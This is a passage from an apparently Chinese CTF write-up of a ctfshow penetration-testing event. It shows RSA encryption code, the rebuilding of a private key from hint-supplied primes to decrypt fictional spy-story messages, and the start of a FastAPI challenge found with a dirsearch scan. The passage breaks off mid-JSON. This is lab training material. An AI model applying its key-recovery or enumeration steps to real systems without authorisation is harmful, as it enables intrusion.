keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> serialization    <span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>asymmetric <span class="token keyword">import</span> padding    <span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> hashes    public_key <span class="token operator">=</span> serialization<span class="token punctuation">.</span>load_pem_public_key<span class="token punctuation">(</span>publicKey<span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    encrypted <span class="token operator">=</span> public_key<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>        message_base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        padding<span class="token punctuation">.</span>OAEP<span class="token punctuation">(</span>            mgf<span class="token operator">=</span>padding<span class="token punctuation">.</span>MGF1<span class="token punctuation">(</span>algorithm<span class="token operator">=</span>hashes<span class="token punctuation">.</span>SHA256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            algorithm<span class="token operator">=</span>hashes<span class="token punctuation">.</span>SHA256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            label<span class="token operator">=</span><span class="token boolean">None</span>        <span class="token punctuation">)</span>    <span class="token punctuation">)</span>    encrypted_base64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> encrypted_base64printMessage<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么我们尝试调用一下这个 printMessage</p><p>直接执行<code>from secretMessageResponse import printMessage</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">请使用组织分配的私钥解密后使用<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">16</span>gHgAsclUVPhWDv4S8Oa8SuRTDaj<span class="token operator">+</span>V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm<span class="token operator">/</span>yv2<span class="token operator">/</span>e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT<span class="token operator">+</span>mg4RkIIFgx35w4J1KgO72pSP8j1p<span class="token operator">+</span>R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u<span class="token operator">+</span>iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r<span class="token operator">/</span>klPHfxQ<span class="token operator">+</span>psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv<span class="token operator">/</span>IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f<span class="token operator">/</span>uS64Ss0Ixii8nmfsFOjQBCcIYN<span class="token operator">+</span>HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7<span class="token operator">+</span>Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH<span class="token operator">+</span>vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU<span class="token operator">/</span>rv4R58obD<span class="token operator">/</span>o<span class="token operator">+</span>QqI1Mrb4wwpX9tsL7ZbROw<span class="token operator">/</span>MXJwM<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>请使用组织分配的私钥解密后使用<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">04</span><span class="token operator">-</span><span class="token number">11</span>Z93Khatj<span class="token operator">+</span>AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX<span class="token operator">/</span>xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh<span class="token operator">/</span>gippMpP<span class="token operator">+</span>8Ik2X<span class="token operator">/</span>QRBx5gdhq0xam<span class="token operator">+</span>wuVC<span class="token operator">+</span><span class="token number">77</span><span class="token operator">/</span>tyu8Fd<span class="token operator">/</span>DohKbAMp8aaJsFr<span class="token operator">/</span>W4mLDZ1gv4JK<span class="token operator">+</span>2O3l<span class="token operator">+</span>bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb<span class="token operator">+</span>SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6<span class="token operator">/</span>LdhqsTNelXl<span class="token operator">/</span>Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG<span class="token operator">+</span>S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB<span class="token operator">/</span>hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX<span class="token operator">/</span>9eBkznEhzeWnJ1yMsYkj<span class="token operator">+</span>ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme<span class="token operator">+</span>T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>请使用组织分配的私钥解密后使用<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">05</span>ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA<span class="token operator">/</span>ICJR7WrwWsVinr6y3u9w<span class="token operator">+</span>ubMZ0mqmtnphzQraagk8NkKc1u1<span class="token operator">+</span>qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi<span class="token operator">+</span>1Aunmy6DeOKRkFwysnrSco5QiiC9<span class="token operator">+</span>gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3<span class="token operator">/</span>Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU<span class="token operator">+</span>iiN4offwrQyr4eEu9ecvmyD2w<span class="token operator">/</span>n7pAOsVnqSzroBujVA<span class="token operator">+</span>CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf<span class="token operator">+</span>MnMQPr80uoxT3mz8IX8pyVnyyw1x6F<span class="token operator">+</span>IK1I2G<span class="token operator">+</span>5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6<span class="token operator">/</span>5Sz1noJrsu6k6WN8ZM0MyRIav<span class="token operator">+</span>xuKP1<span class="token operator">+</span>cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA<span class="token operator">/</span>cEjOICWVzUXwbE5wWUBPCLp2C<span class="token operator">/</span>XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk<span class="token operator">/</span>ahaxdGxGa9CrRyr6sf<span class="token operator">+</span>goA<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用hint.txt给的p，q生成私钥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSAe <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span>q <span class="token operator">=</span> <span class="token number">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">)</span>private <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"privatekey.pem"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>private<span class="token punctuation">.</span>export_key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20241231212646503.png" alt="image-20241231212646503"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">2024-03-05Park:总部已经为你安排新的身份，请务必在3日内抵台，你的新身份是新竹县动物保护防疫所网络安全顾问，【任务中心】账号密码和你任职单位网站的数据库用户名密码一致，请尽快修改 发送人：Dylan2024-04-11Park:【任务中心】网址已变更为 https://task.ctfer.com ，请注意修改浏览器地址栏中的链接 发送人：Dylan2024-12-16Park:你的行动已经暴露，24小时内迅速撤离，销毁所有资料，将现有资料统一上传到【任务中心】发送人：Dylan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag：<code>ctfshow&#123;https://task.ctfer.com&#125;</code></p><hr><h2 id="潜入敌营"><a href="#潜入敌营" class="headerlink" title="潜入敌营"></a>潜入敌营</h2><p>启动靶机，dirsearch 扫出 openapi.json，是个 fastapi 服务</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"openapi"</span><span class="token operator">:</span> <span class="token string">"3.1.0"</span><span class="token punctuation">,</span>  <span class="token property">"info"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"FastAPI"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.1.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"paths"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"/login"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"post"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Login"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"login_login_post"</span><span class="token punctuation">,</span>        <span class="token property">"requestBody"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"application/x-www-form-urlencoded"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/Body_login_login_post"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/Token"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Root"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"root__get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/task_newest"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Task Newest"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"task_newest_task_newest_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/task_completed"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Task Completed"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"task_completed_task_completed_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/task_cancelled"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Task Cancelled"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"task_cancelled_task_cancelled_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/message_inbox"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Message Inbox"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"message_inbox_message_inbox_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span 